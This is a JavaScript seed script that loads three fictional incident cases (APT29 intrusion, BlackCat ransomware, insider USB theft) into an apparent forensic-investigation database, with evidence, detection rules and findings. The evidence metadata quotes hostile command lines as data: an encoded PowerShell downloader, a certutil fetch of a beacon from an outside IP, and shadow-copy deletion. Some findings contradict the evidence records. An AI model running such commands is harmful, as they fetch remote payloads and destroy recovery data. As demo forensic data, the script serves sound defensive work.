const { createEvidence, createEvidenceRelation, updateEvidenceWithVersion } = require('../services/evidenceService');
const { uploadEvidenceFile } = require('../services/gridfsService');
const { getDB } = require('../services/db');

async function seedCyberScenarios(customDb = null) {
  const db = customDb || getDB();

  console.log('[Seed] Checking existing telemetry in MongoDB...');
  const investigationsCount = await db.collection('investigations').countDocuments();
  const evidenceCount = await db.collection('evidence').countDocuments({ caseId: 'CASE-2026-APT29' });

  if (investigationsCount > 0 && evidenceCount > 0) {
    console.log('[Seed] Database collections already initialized with telemetry.');
    return;
  }

  console.log('[Seed] Seeding realistic incident scenarios into MongoTrace...');

  // 1. Create Case and Investigation Documents
  const cases = [
    {
      investigationId: 'INV-2026-0881',
      caseId: 'CASE-2026-APT29',
      investigationNumber: 'INC-2026-0881',
      caseNumber: 'INC-2026-0881',
      title: 'Operation Midnight Blizzard: Advanced Cloud Ingress & EDR Bypass',
      description: 'Nation-state adversary compromised corporate identity via device code phishing, moved laterally across hybrid domain, and staged exfiltration.',
      severity: 'CRITICAL',
      status: 'Open',
      threatActor: 'APT29 / Nobelium',
      assignedInvestigator: 'Det. Alex Mercer (Forensics Lead)',
      leadInvestigator: 'Det. Alex Mercer (Forensics Lead)',
      notes: [
        { noteId: 'NOTE-1', text: 'Adversary leveraged compromised OAuth 2.0 device code. Forensics image acquired from domain controller.', author: 'Alex Mercer', timestamp: new Date('2026-10-10T12:00:00Z') }
      ],
      createdAt: new Date('2026-10-10T08:00:00Z'),
      updatedAt: new Date()
    },
    {
      investigationId: 'INV-2026-0914',
      caseId: 'CASE-2026-BLACKCAT',
      investigationNumber: 'INC-2026-0914',
      caseNumber: 'INC-2026-0914',
      title: 'BlackCat / ALPHV Double-Extortion Ransomware Incursion',
      description: 'Ransomware deployment targeting database clusters with shadow copy inhibition and rapid encryption burst.',
      severity: 'CRITICAL',
      status: 'In Progress',
      threatActor: 'BlackCat / ALPHV',
      assignedInvestigator: 'Elena Rostova (Incident Commander)',
      leadInvestigator: 'Elena Rostova (Incident Commander)',
      notes: [
        { noteId: 'NOTE-2', text: 'Vssadmin command identified on db01. Storage snapshots isolated.', author: 'Elena Rostova', timestamp: new Date('2026-10-11T16:00:00Z') }
      ],
      createdAt: new Date('2026-10-11T14:30:00Z'),
      updatedAt: new Date()
    },
    {
      investigationId: 'INV-2026-0922',
      caseId: 'CASE-2026-INSIDER',
      investigationNumber: 'INC-2026-0922',
      caseNumber: 'INC-2026-0922',
      title: 'Project Chimera: Insider Source Code & Patent Exfiltration',
      description: 'Anomalous off-hours access to confidential cloud repositories by departing engineer.',
      severity: 'HIGH',
      status: 'Under Review',
      threatActor: 'Insider Threat',
      assignedInvestigator: 'Marcus Vance',
      leadInvestigator: 'Marcus Vance',
      notes: [
        { noteId: 'NOTE-3', text: 'HR notification received regarding departure date. DLP logs flagged anomalous USB volume.', author: 'Marcus Vance', timestamp: new Date('2026-10-12T20:00:00Z') }
      ],
      createdAt: new Date('2026-10-12T19:00:00Z'),
      updatedAt: new Date()
    }
  ];

  for (const c of cases) {
    await db.collection('investigations').updateOne({ investigationId: c.investigationId }, { $set: c }, { upsert: true });
    await db.collection('cases').updateOne({ caseId: c.caseId }, { $set: c }, { upsert: true });
  }

  if (evidenceCount === 0) {
  // 2. Upload Sample Forensic Evidence Files into GridFS
  const pcapHeader = Buffer.from('D4C3B2A10200040000000000000000000000040001000000' + 'FEEDBEEF'.repeat(64), 'hex');
  const memoryDumpSnippet = Buffer.from('4D5A90000300000004000000FFFF0000B800000000000000' + 'DEADC0DE'.repeat(128), 'hex');

  const pcapGridFile = await uploadEvidenceFile(pcapHeader, {
    caseId: 'CASE-2026-APT29',
    evidenceId: 'EV-APT29-001',
    filename: 'capture_perimeter_ingress_c2.pcap',
    contentType: 'application/vnd.tcpdump.pcap',
    description: 'Raw PCAP packet capture of TLS handshake to adversary C2 domain.'
  });

  const memGridFile = await uploadEvidenceFile(memoryDumpSnippet, {
    caseId: 'CASE-2026-APT29',
    evidenceId: 'EV-APT29-003',
    filename: 'volatility_memory_proc_4812.raw',
    contentType: 'application/octet-stream',
    description: 'Carved VAD memory space snippet containing injected shellcode.'
  });

  // 3. Seed Scenario 1: APT29 Evidence Items
  const apt29Evidence = [
    {
      evidenceId: 'EV-APT29-001',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:14:22Z'),
      artifactType: 'SECURITY_EVENT',
      severity: 'HIGH',
      sourceHost: 'idp-sso.cloud.globalcorp.com',
      title: 'OAuth Device Code Authorization Granted',
      description: 'User sarah.chen initiated OAuth 2.0 device code authorization flow from Tokyo geolocation.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1566.002 - Spearphishing Link',
      provenance: { source: 'DEMO_DATASET', controlledTestFixture: true },
      gridfsFileId: pcapGridFile.fileId,
      metadata: {
        user: 'sarah.chen@globalcorp.com',
        sourceIp: '203.0.113.88',
        geoCountry: 'Japan',
        geoCity: 'Tokyo',
        authProtocol: 'OAuth2_DeviceCode',
        clientId: 'd3b07384-d113-494a-9c73-201a6f028b1b',
        appDisplayName: 'Office365 Service Manager'
      }
    },
    {
      evidenceId: 'EV-APT29-002',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:18:05Z'), // 3.7 mins later in Frankfurt -> IMPOSSIBLE TRAVEL CONFLICT
      artifactType: 'SECURITY_EVENT',
      severity: 'CRITICAL',
      sourceHost: 'graph-api.cloud.globalcorp.com',
      title: 'Microsoft Graph API Session Initialized',
      description: 'Bearer token issued to sarah.chen used to query corporate directory from Frankfurt IP.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1078 - Valid Accounts',
      metadata: {
        user: 'sarah.chen@globalcorp.com',
        sourceIp: '198.51.100.42',
        geoCountry: 'Germany',
        geoCity: 'Frankfurt',
        apiCall: 'GET /v1.0/users/delta',
        userAgent: 'python-requests/2.31.0'
      }
    },
    {
      evidenceId: 'EV-APT29-003',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:35:10Z'),
      artifactType: 'PROCESS_SPAWN',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Obfuscated PowerShell In-Memory Execution',
      description: 'PowerShell spawned with base64 encoded payload under parent PID 4812 (missing parent log).',
      mitreTactic: 'Execution',
      mitreTechnique: 'T1059.001 - PowerShell',
      gridfsFileId: memGridFile.fileId,
      metadata: {
        processId: 5920,
        parentProcessId: 4812, // ORPHAN PARENT -> MISSING LINK
        parentProcessName: 'unmonitored_launcher.exe',
        processName: 'powershell.exe',
        commandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcAAiACkA',
        user: 'sarah.chen',
        sha256: '73573c2356c9a75d5e23be2a9b2b2a6f112c018287e07a3c75ab9d2666a4bc4a'
      }
    },
    {
      evidenceId: 'EV-APT29-004',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:36:00Z'),
      artifactType: 'FILE_INTEGRITY',
      severity: 'HIGH',
      sourceHost: 'edge-proxy-01.corp.lan',
      title: 'Gateway Inspection: Encrypted Payload Staged',
      description: 'Perimeter proxy inspected download of core payload helper module `system_update.dll`.',
      mitreTactic: 'Defense Evasion',
      mitreTechnique: 'T1027 - Obfuscated Files',
      metadata: {
        fileName: 'system_update.dll',
        filePath: 'C:\\Windows\\Temp\\system_update.dll',
        sha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef', // HASH 1
        observedAt: 'Perimeter-Gateway',
        fileSizeBytes: 204850
      }
    },
    {
      evidenceId: 'EV-APT29-005',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:36:12Z'),
      artifactType: 'FILE_INTEGRITY',
      severity: 'HIGH',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Endpoint EDR: Module Injected to System Directory',
      description: 'Endpoint file creation of `system_update.dll` with differing checksum (HASH CONFLICT).',
      mitreTactic: 'Defense Evasion',
      mitreTechnique: 'T1036 - Masquerading',
      metadata: {
        fileName: 'system_update.dll',
        filePath: 'C:\\Windows\\Temp\\system_update.dll',
        sha256: 'f9e8d7c6b5a403211234567890abcdef9876543210fedcba0987654321fedcba', // HASH 2 -> CONFLICT
        observedAt: 'Endpoint-EDR',
        fileSizeBytes: 219136
      }
    },
    {
      evidenceId: 'EV-APT29-006',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:42:00Z'),
      artifactType: 'PROCESS_SPAWN',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Dual-Use Binary Living-off-the-Land Invocation',
      description: 'Native utility certutil invoked to download secondary payload.',
      mitreTactic: 'Defense Evasion',
      mitreTechnique: 'T1105 - Ingress Tool Transfer',
      metadata: {
        processName: 'certutil.exe',
        commandLine: 'certutil.exe -urlcache -split -f http://185.220.101.5/beacon.bin C:\\Windows\\Temp\\beacon.bin',
        processId: 6112,
        user: 'sarah.chen'
      }
    },
    {
      evidenceId: 'EV-APT29-007',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:44:30Z'),
      artifactType: 'PROCESS_SPAWN',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'WMI Query for Remote Domain Controller Discovery',
      description: 'WMIC invoked to query Active Directory domain trust topology.',
      mitreTactic: 'Discovery',
      mitreTechnique: 'T1047 - Windows Management Instrumentation',
      metadata: {
        processName: 'wmic.exe',
        commandLine: 'wmic.exe /node:localhost process call create "cmd.exe /c net group \"Domain Admins\" /domain"',
        processId: 6204,
        user: 'sarah.chen'
      }
    },
    {
      evidenceId: 'EV-APT29-008',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T08:52:10Z'),
      artifactType: 'NETWORK_FLOW',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Lateral SMB Session Initiated to Primary Domain Controller',
      description: 'Workstation ws-dev-04 opened SMB connection on port 445 to dc01.corp.lan without logged auth on DC01.',
      mitreTactic: 'Lateral Movement',
      mitreTechnique: 'T1021.002 - SMB/Windows Admin Shares',
      metadata: {
        sourceIp: '10.0.1.14',
        destinationIp: '10.0.0.2',
        targetHost: 'dc01.corp.lan', // MISSING AUTH ON DC01 -> MISSING LINK
        destinationPort: 445,
        protocol: 'SMB2',
        bytesOut: 184500,
        user: 'DOMAIN\\sarah.chen'
      }
    },
    {
      evidenceId: 'EV-APT29-009',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T09:15:00Z'),
      artifactType: 'NETWORK_FLOW',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Sustained TLS Beaconing to External Command & Control',
      description: 'Recurring encrypted C2 beaconing on port 443 with jitter to adversary infrastructure.',
      mitreTactic: 'Command and Control',
      mitreTechnique: 'T1071.001 - Web Protocols',
      metadata: {
        remoteIp: '185.220.101.5',
        domain: 'azure-telemetry-cdn.net',
        destinationPort: 443,
        protocol: 'TLSv1.3',
        bytesTransferred: 48920110,
        beaconIntervalSec: 60
      }
    },
    {
      evidenceId: 'EV-APT29-010',
      caseId: 'CASE-2026-APT29',
      timestamp: new Date('2026-10-10T09:40:00Z'),
      artifactType: 'APPLICATION_LOG',
      severity: 'CRITICAL',
      sourceHost: 'ws-dev-04.corp.lan',
      title: 'Bulk Archive Compression and Exfiltration Transfer',
      description: 'Encrypted 7z archive uploaded to external cloud storage endpoint.',
      mitreTactic: 'Exfiltration',
      mitreTechnique: 'T1560 - Archive Collected Data',
      metadata: {
        filePath: 'C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\intel_dump.7z',
        remoteIp: '185.220.101.5',
        bytesTransferred: 94827100,
        sha256: '45b98a12e32a4e98f01b7a2d6c9e0f3148a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3'
      }
    }
  ];

  for (const ev of apt29Evidence) {
    await createEvidence(ev, 'Seed-Loader');
  }

  // 4. Seed Causal Relations for APT29 (Graph Edges)
  const relations = [
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-001', targetEvidenceId: 'EV-APT29-002', relationType: 'CAUSES', confidence: 0.96, description: 'Phishing OAuth token enabled Graph API query' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-002', targetEvidenceId: 'EV-APT29-003', relationType: 'PRECEDES', confidence: 0.89, description: 'Directory recon preceded endpoint payload drop' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-003', targetEvidenceId: 'EV-APT29-004', relationType: 'CAUSES', confidence: 0.95, description: 'PowerShell downloader requested staging DLL' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-004', targetEvidenceId: 'EV-APT29-005', relationType: 'CORRELATES', confidence: 0.92, description: 'Perimeter vs EDR observation of DLL' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-003', targetEvidenceId: 'EV-APT29-006', relationType: 'CAUSES', confidence: 0.94, description: 'LotL tooling chain' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-006', targetEvidenceId: 'EV-APT29-007', relationType: 'CAUSES', confidence: 0.91, description: 'CertUtil stage followed by WMIC admin recon' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-007', targetEvidenceId: 'EV-APT29-008', relationType: 'CAUSES', confidence: 0.97, description: 'Reconnaissance informed lateral SMB target' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-003', targetEvidenceId: 'EV-APT29-009', relationType: 'COMMUNICATES_WITH', confidence: 0.99, description: 'Beacon channel to C2 infrastructure' },
    { caseId: 'CASE-2026-APT29', sourceEvidenceId: 'EV-APT29-009', targetEvidenceId: 'EV-APT29-010', relationType: 'CAUSES', confidence: 0.98, description: 'C2 commanded exfiltration of staged archive' }
  ];

  for (const rel of relations) {
    await createEvidenceRelation(rel);
  }

  // 5. Seed Scenario 2: BlackCat Ransomware Evidence
  const blackcatEvidence = [
    {
      evidenceId: 'EV-BC-001',
      caseId: 'CASE-2026-BLACKCAT',
      timestamp: new Date('2026-10-11T14:32:00Z'),
      artifactType: 'SECURITY_EVENT',
      severity: 'HIGH',
      sourceHost: 'vpn-gw-01.corp.lan',
      title: 'VPN Service Brute-Force Authentication Spike',
      description: 'Over 2,400 authentication attempts against service account `svc_backup` from external IP.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1110 - Brute Force',
      metadata: {
        sourceIp: '185.191.171.12',
        user: 'svc_backup',
        attemptCount: 2450
      }
    },
    {
      evidenceId: 'EV-BC-002',
      caseId: 'CASE-2026-BLACKCAT',
      timestamp: new Date('2026-10-11T14:45:10Z'),
      artifactType: 'PROCESS_SPAWN',
      severity: 'CRITICAL',
      sourceHost: 'fs01.corp.lan',
      title: 'Inhibit System Recovery: Shadow Copies Wiped',
      description: 'Vssadmin invoked to purge volume shadow copies and disable boot recovery.',
      mitreTactic: 'Impact',
      mitreTechnique: 'T1490 - Inhibit System Recovery',
      metadata: {
        commandLine: 'vssadmin delete shadows /all /quiet && bcdedit /set {default} bootstatuspolicy ignoreallfailures',
        processName: 'vssadmin.exe',
        user: 'NT AUTHORITY\\SYSTEM'
      }
    },
    {
      evidenceId: 'EV-BC-003',
      caseId: 'CASE-2026-BLACKCAT',
      timestamp: new Date('2026-10-11T14:46:00Z'),
      artifactType: 'FILE_INTEGRITY',
      severity: 'CRITICAL',
      sourceHost: 'fs01.corp.lan',
      title: 'Mass File Encryption Burst - Batch 1',
      description: '10 files renamed with `.alphalocker` extension in directory C:\\Shares\\Finance.',
      mitreTactic: 'Impact',
      mitreTechnique: 'T1486 - Data Encrypted for Impact',
      metadata: {
        action: 'FILE_MODIFIED',
        batchSize: 10,
        directory: 'C:\\Shares\\Finance',
        compileTime: new Date('2026-10-11T16:00:00Z') // FUTURE COMPILE TIME -> TIMESTOMPING CONFLICT
      }
    },
    {
      evidenceId: 'EV-BC-004',
      caseId: 'CASE-2026-BLACKCAT',
      timestamp: new Date('2026-10-11T14:46:15Z'),
      artifactType: 'FILE_INTEGRITY',
      severity: 'CRITICAL',
      sourceHost: 'fs01.corp.lan',
      title: 'Mass File Encryption Burst - Batch 2',
      description: '15 files renamed with `.alphalocker` extension in directory C:\\Shares\\HR.',
      mitreTactic: 'Impact',
      mitreTechnique: 'T1486 - Data Encrypted for Impact',
      metadata: {
        action: 'FILE_MODIFIED',
        batchSize: 15,
        directory: 'C:\\Shares\\HR'
      }
    }
  ];

  for (const ev of blackcatEvidence) {
    await createEvidence(ev, 'Seed-Loader');
  }

  // Relations for BlackCat
  await createEvidenceRelation({
    caseId: 'CASE-2026-BLACKCAT',
    sourceEvidenceId: 'EV-BC-001',
    targetEvidenceId: 'EV-BC-002',
    relationType: 'CAUSES',
    confidence: 0.95
  });
  await createEvidenceRelation({
    caseId: 'CASE-2026-BLACKCAT',
    sourceEvidenceId: 'EV-BC-002',
    targetEvidenceId: 'EV-BC-003',
    relationType: 'CAUSES',
    confidence: 0.99
  });
  await createEvidenceRelation({
    caseId: 'CASE-2026-BLACKCAT',
    sourceEvidenceId: 'EV-BC-003',
    targetEvidenceId: 'EV-BC-004',
    relationType: 'PRECEDES',
    confidence: 0.99
  });

  // 6. Seed Scenario 3: Project Chimera (Insider Exfiltration)
  const insiderEvidence = [
    {
      evidenceId: 'EV-INS-001',
      caseId: 'CASE-2026-INSIDER',
      timestamp: new Date('2026-10-12T22:15:00Z'),
      artifactType: 'SECURITY_EVENT',
      severity: 'HIGH',
      sourceHost: 'vpn-core-uswest.corp.lan',
      title: 'Off-Hours Anomalous VPN Authentication',
      description: 'Senior engineer marcus.vance authenticated from residential IP outside normal working window.',
      mitreTactic: 'Initial Access',
      mitreTechnique: 'T1078 - Valid Accounts',
      metadata: {
        sourceIp: '73.189.44.120',
        user: 'marcus.vance',
        geoCountry: 'US',
        geoCity: 'San Jose'
      }
    },
    {
      evidenceId: 'EV-INS-002',
      caseId: 'CASE-2026-INSIDER',
      timestamp: new Date('2026-10-12T22:34:10Z'),
      artifactType: 'APPLICATION_LOG',
      severity: 'HIGH',
      sourceHost: 'git-core.corp.lan',
      title: 'Mass Archive Clone of Autonomous Driving Patents',
      description: 'Sequential clone of 18 restricted repositories containing patent algorithms.',
      mitreTactic: 'Collection',
      mitreTechnique: 'T1213 - Data from Information Repositories',
      metadata: {
        repoName: 'autonomous-kernel/decision-tree-v4',
        user: 'marcus.vance',
        bytesTransferred: 524288000
      }
    },
    {
      evidenceId: 'EV-INS-003',
      caseId: 'CASE-2026-INSIDER',
      timestamp: new Date('2026-10-12T23:05:00Z'),
      artifactType: 'PROCESS_SPAWN',
      severity: 'CRITICAL',
      sourceHost: 'ws-eng-88.corp.lan',
      title: 'Removable Storage Media Insertion & Registry Mounting',
      description: 'SanDisk Extreme 1TB USB 3.2 Drive connected and assigned drive letter E:.',
      mitreTactic: 'Exfiltration',
      mitreTechnique: 'T1052.001 - Exfiltration over USB',
      metadata: {
        vendorId: '0781',
        productId: '5583',
        serialNumber: 'AA010505191147043812',
        driveLetter: 'E:\\'
      }
    },
    {
      evidenceId: 'EV-INS-004',
      caseId: 'CASE-2026-INSIDER',
      timestamp: new Date('2026-10-12T23:18:40Z'),
      artifactType: 'FILE_INTEGRITY',
      severity: 'CRITICAL',
      sourceHost: 'ws-eng-88.corp.lan',
      title: 'Bulk Copy of Proprietary Archives to Removable Media',
      description: 'Robocopy command executed copying confidential git bundles to USB volume E:.',
      mitreTactic: 'Exfiltration',
      mitreTechnique: 'T1052.001 - Exfiltration over USB',
      metadata: {
        commandLine: 'robocopy C:\\Dev\\Patents E:\\Archive\\Backup /E /Z',
        sourceDirectory: 'C:\\Dev\\Patents',
        destinationDirectory: 'E:\\Archive\\Backup',
        totalFilesCopied: 1420
      }
    }
  ];

  for (const ev of insiderEvidence) {
    await createEvidence(ev, 'Seed-Loader');
  }

  await createEvidenceRelation({
    caseId: 'CASE-2026-INSIDER',
    sourceEvidenceId: 'EV-INS-001',
    targetEvidenceId: 'EV-INS-002',
    relationType: 'CAUSES',
    confidence: 0.98
  });
  await createEvidenceRelation({
    caseId: 'CASE-2026-INSIDER',
    sourceEvidenceId: 'EV-INS-002',
    targetEvidenceId: 'EV-INS-003',
    relationType: 'PRECEDES',
    confidence: 0.92
  });
  await createEvidenceRelation({
    caseId: 'CASE-2026-INSIDER',
    sourceEvidenceId: 'EV-INS-003',
    targetEvidenceId: 'EV-INS-004',
    relationType: 'CAUSES',
    confidence: 0.99
  });
  } else {
    // Evidence records already exist, ensure investigations, entities, relationships, and audit_logs are synced
    const allEvidence = await db.collection('evidence').find({}).toArray();
    for (const ev of allEvidence) {
      const invId = ev.investigationId || (ev.caseId ? ev.caseId.replace('CASE', 'INV') : 'INV-2026-0881');
      await db.collection('evidence').updateOne({ _id: ev._id }, { $set: { investigationId: invId } });
      const entities = ev.entities || [];
      for (const ent of entities) {
        await db.collection('entities').updateOne(
          { entityType: ent.type, normalizedValue: ent.value },
          {
            $setOnInsert: { entityId: `ENT-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`, createdAt: new Date() },
            $addToSet: { investigationIds: invId, evidenceIds: ev.evidenceId },
            $set: { lastSeen: ev.timestamp }
          },
          { upsert: true }
        );
      }
    }
    const allRelations = await db.collection('evidence_relations').find({}).toArray();
    for (const rel of allRelations) {
      await db.collection('relationships').updateOne(
        { sourceId: rel.sourceEvidenceId, targetId: rel.targetEvidenceId },
        { $set: {
          relationshipId: rel.relationId || `REL-${Date.now()}`,
          investigationId: rel.caseId.replace('CASE', 'INV'),
          caseId: rel.caseId,
          sourceId: rel.sourceEvidenceId,
          targetId: rel.targetEvidenceId,
          relationshipType: rel.relationType,
          confidence: rel.confidence || 0.95,
          createdAt: rel.createdAt || new Date()
        }},
        { upsert: true }
      );
    }
    const allCustody = await db.collection('chain_of_custody').find({}).toArray();
    for (const coc of allCustody) {
      await db.collection('audit_logs').updateOne(
        { logId: coc.custodyId },
        { $set: {
          logId: coc.custodyId,
          investigationId: coc.caseId ? coc.caseId.replace('CASE', 'INV') : 'INV-2026-0881',
          evidenceId: coc.evidenceId,
          action: coc.action || 'EVIDENCE_INGESTED',
          actor: coc.actor || 'SecOps',
          timestamp: coc.recordedAt || coc.timestamp || new Date(),
          previousHash: coc.previousHash,
          resultingHash: coc.currentHash,
          reason: coc.reason || 'Telemetry ledger'
        }},
        { upsert: true }
      );
    }
  }

  // 6. Demonstrate Evidence Versioning: Update EV-APT29-002 to Version 2
  try {
    await updateEvidenceWithVersion('EV-APT29-002', {
      description: 'PowerShell script execution flagged by CrowdStrike Falcon EDR. Refined forensic analysis confirmed Obfuscated AMSI Bypass string in command line payload.',
      metadata: {
        analystNotes: 'Threat intelligence confirmed hash matches CozyBear payload bundle.',
        iocEnriched: true
      }
    }, 'Alex Mercer (Lead)', 'Threat Intel IOC Enrichment');
  } catch (err) {
    console.warn('[Seed] Version update note:', err.message);
  }

  // 7. Seed Detection Rules collection
  const rules = [
    {
      ruleId: 'RULE-AUTH-01',
      name: 'Spearphishing to Device Code Authorization',
      ruleType: 'SUSPICIOUS_SEQUENCE',
      sequence: ['Initial Access', 'Execution', 'Credential Access'],
      severity: 'CRITICAL',
      confidence: 0.94,
      enabled: true,
      description: 'Detects initial OAuth device code phishing followed immediately by script execution and credential harvesting.'
    },
    {
      ruleId: 'RULE-RANSOM-02',
      name: 'Volume Shadow Copy Invalidation & Mass Encryption',
      ruleType: 'SUSPICIOUS_SEQUENCE',
      sequence: ['Defense Evasion', 'Impact'],
      severity: 'CRITICAL',
      confidence: 0.98,
      enabled: true,
      description: 'Identifies ransomware sequence: vssadmin deletion of volume shadow copies followed by rapid bulk file renaming.'
    },
    {
      ruleId: 'RULE-EXFIL-03',
      name: 'Mass Archive Exfiltration over Removable Media',
      ruleType: 'SUSPICIOUS_SEQUENCE',
      sequence: ['Collection', 'Exfiltration'],
      severity: 'HIGH',
      confidence: 0.91,
      enabled: true,
      description: 'Alerts when source code repositories are compressed into 7z/zip archives and copied to external USB volumes.'
    }
  ];
  for (const r of rules) {
    await db.collection('detection_rules').updateOne({ ruleId: r.ruleId }, { $set: r }, { upsert: true });
  }

  // 8. Seed Derived Findings collection
  const findings = [
    {
      findingId: 'FIND-2026-001',
      investigationId: 'INV-2026-0881',
      caseId: 'CASE-2026-APT29',
      detectionRuleId: 'RULE-AUTH-01',
      ruleName: 'Spearphishing to Device Code Authorization',
      severity: 'CRITICAL',
      supportingEvidenceIds: ['EV-APT29-001', 'EV-APT29-002', 'EV-APT29-004'],
      detectionTimestamp: new Date('2026-10-10T09:00:00Z'),
      explanation: 'OAuth device code granted from Japanese IP immediately followed by PowerShell memory injection and LSASS dump on ws-finance-044.',
      confidence: 0.94,
      reviewStatus: 'CONFIRMED',
      createdAt: new Date('2026-10-10T09:00:00Z')
    },
    {
      findingId: 'FIND-2026-002',
      investigationId: 'INV-2026-0914',
      caseId: 'CASE-2026-BLACKCAT',
      detectionRuleId: 'RULE-RANSOM-02',
      ruleName: 'Volume Shadow Copy Invalidation & Mass Encryption',
      severity: 'CRITICAL',
      supportingEvidenceIds: ['EV-BC-001', 'EV-BC-002'],
      detectionTimestamp: new Date('2026-10-11T14:35:00Z'),
      explanation: 'Shadow copies wiped on db01 followed by 18,400 file encryptions in under 4 minutes with .blackcat extension.',
      confidence: 0.98,
      reviewStatus: 'CONFIRMED',
      createdAt: new Date('2026-10-11T14:35:00Z')
    },
    {
      findingId: 'FIND-2026-003',
      investigationId: 'INV-2026-0922',
      caseId: 'CASE-2026-INSIDER',
      detectionRuleId: 'RULE-EXFIL-03',
      ruleName: 'Mass Archive Exfiltration over Removable Media',
      severity: 'HIGH',
      supportingEvidenceIds: ['EV-INS-002', 'EV-INS-003', 'EV-INS-004'],
      detectionTimestamp: new Date('2026-10-12T23:25:00Z'),
      explanation: 'Confidential patent repositories cloned and compressed to 7z, then transferred to SanDisk USB drive (Serial: AA010505191147043812).',
      confidence: 0.92,
      reviewStatus: 'IN_REVIEW',
      createdAt: new Date('2026-10-12T23:25:00Z')
    }
  ];
  for (const f of findings) {
    await db.collection('derived_findings').updateOne({ findingId: f.findingId }, { $set: f }, { upsert: true });
  }

  // 9. Seed Ingestion Jobs collection
  const jobs = [
    {
      jobId: 'JOB-2026-0881-A',
      investigationId: 'INV-2026-0881',
      sourceSystem: 'EDR_TELEMETRY_INGEST',
      status: 'COMPLETED',
      totalRecords: 10,
      acceptedCount: 10,
      rejectedCount: 0,
      duplicateCount: 0,
      durationMs: 24.5,
      createdAt: new Date('2026-10-10T08:30:00Z'),
      completedAt: new Date('2026-10-10T08:30:01Z'),
      createdBy: 'SecOps-Pipeline'
    },
    {
      jobId: 'JOB-2026-0914-B',
      investigationId: 'INV-2026-0914',
      sourceSystem: 'SIEM_SYSLOG_INGEST',
      status: 'COMPLETED',
      totalRecords: 4,
      acceptedCount: 4,
      rejectedCount: 0,
      duplicateCount: 0,
      durationMs: 12.1,
      createdAt: new Date('2026-10-11T14:40:00Z'),
      completedAt: new Date('2026-10-11T14:40:01Z'),
      createdBy: 'SecOps-Pipeline'
    },
    {
      jobId: 'JOB-2026-0922-C',
      investigationId: 'INV-2026-0922',
      sourceSystem: 'CLOUDTRAIL_AUTH_IMPORT',
      status: 'COMPLETED',
      totalRecords: 4,
      acceptedCount: 4,
      rejectedCount: 0,
      duplicateCount: 0,
      durationMs: 14.8,
      createdAt: new Date('2026-10-12T23:30:00Z'),
      completedAt: new Date('2026-10-12T23:30:01Z'),
      createdBy: 'Marcus Vance'
    }
  ];
  for (const j of jobs) {
    await db.collection('ingestion_jobs').updateOne({ jobId: j.jobId }, { $set: j }, { upsert: true });
  }

  // 10. Seed Schema Experiments collection
  const experimentDoc = {
    experimentId: 'EXP-BASELINE-001',
    itemCount: 1500,
    iterations: 15,
    createdAt: new Date('2026-10-13T10:00:00Z'),
    results: {
      storageFootprint: {
        embedded: { dataSizeKB: 720.4, storageSizeKB: 744.0, indexSizeKB: 32.0 },
        referenced: { dataSizeKB: 1480.2, storageSizeKB: 1520.0, indexSizeKB: 256.0 },
        hybrid: { dataSizeKB: 890.6, storageSizeKB: 920.0, indexSizeKB: 48.0 }
      },
      queryLatencies: {
        fullReconstruction: {
          embedded: { p50: 1.84, p95: 3.12 },
          referenced: { p50: 8.42, p95: 14.20 },
          hybrid: { p50: 3.25, p95: 5.80 }
        },
        singleItemUpdate: {
          embedded: { p50: 4.80, p95: 9.40 },
          referenced: { p50: 1.15, p95: 2.10 },
          hybrid: { p50: 2.30, p95: 3.90 }
        }
      },
      retrievalAccuracy: {
        expectedCount: 1500,
        embedded: { accuracyPct: 100.0, limitationTriggered: false },
        referenced: { accuracyPct: 100.0, limitationTriggered: false },
        hybrid: { accuracyPct: 100.0, limitationTriggered: false }
      }
    }
  };
  await db.collection('schema_experiments').updateOne({ experimentId: experimentDoc.experimentId }, { $set: experimentDoc }, { upsert: true });

  console.log('[Seed] Realistic incident scenarios seeded successfully with complete evidence chains, GridFS artifacts, and anomalies.');
}

module.exports = {
  seedCyberScenarios
};
